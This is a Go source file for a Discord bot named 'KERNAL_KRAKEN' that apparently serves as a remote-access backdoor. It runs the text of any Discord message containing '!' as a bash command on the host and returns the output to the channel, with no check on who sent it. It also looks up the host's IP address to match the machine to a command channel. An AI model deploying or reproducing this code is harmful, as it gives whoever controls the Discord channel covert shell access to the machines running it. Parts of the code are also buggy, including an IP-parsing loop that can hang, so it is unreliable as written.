package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

func execute(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	if strings.Contains(m.Content, "!") {
		command := m.Content[1:]

		cmd := exec.Command("/bin/bash", "-c", command)
		out, err := cmd.Output()
		if err != nil {
			fmt.Println(err, " on ", command)
			s.ChannelMessageSend(m.ChannelID, string("Sorry the command failed, please try again."))
		}

		if len(out) > 2000 {
			now := time.Now()
			filename := "KERNAL_KRAKEN" + now.Format("2006-01-02_15-04-05.txt")
			err := ioutil.WriteFile(filename, []byte(out), 0644)
			if err != nil {
				fmt.Print(err)
			}
			file, err := os.Open(filename)
			if err != nil {
				fmt.Println(err)
			}
			defer file.Close()

			s.ChannelMessageSend(m.ChannelID, "Output too long, sending as file")
			s.ChannelFileSend(m.ChannelID, filename, file)
		}

		s.ChannelMessageSend(m.ChannelID, string(out))
	}
}

func setup() string {
	ip, channelID := "", ""
	cmd := exec.Command("/bin/bash", "-c", "ifconfig")
	out, err := cmd.Output()
	if err != nil {
		fmt.Println(err)
	}

	for {
		if strings.Contains(string(out), "inet ") {
			ip = string(out[strings.Index(string(out), "inet ")+5 : strings.Index(string(out), "netmask:")-1])
			if(ip == "127.0.0.1"){
				ip = ""
				out = out[strings.Index(string(out), "inet") +1 :]
			}else{
				break;
			}
		}

	}

	file, err := os.Open("KernalKraken_config.txt")
	if err != nil {
		fmt.Println(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		if scanner.Text() == ip {
			line := strings.Split(scanner.Text(), " ")
			if len(line) > 1 {
				channelID = line[2]
			}
		}
	}

	return channelID

}

func main() {
	err := godotenv.Load(".env")
	if err != nil {
		log.Fatal("Error loading .env file")
	}

	sess, err := discordgo.New("Bot " + os.Getenv("GITHUB_CLIENT_TOKEN"))
	if err != nil {
		log.Fatal(err)
	}

	channelID := setup()

	sess.AddHandler(func(s *discordgo.Session, m *discordgo.MessageCreate) {
		if m.Author.ID == s.State.User.ID {
			return
		}

		if m.ChannelID == channelID {
			if m.Content == "ping" {
				s.ChannelMessageSend(m.ChannelID, "pong")
			}
		}
	})

	sess.AddHandler(execute)

	sess.Identify.Intents = discordgo.IntentsAllWithoutPrivileged

	err = sess.Open()
	if err != nil {
		log.Fatal(err)
	}

	defer sess.Close()
	fmt.Print("Bot is running...")

	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc
}
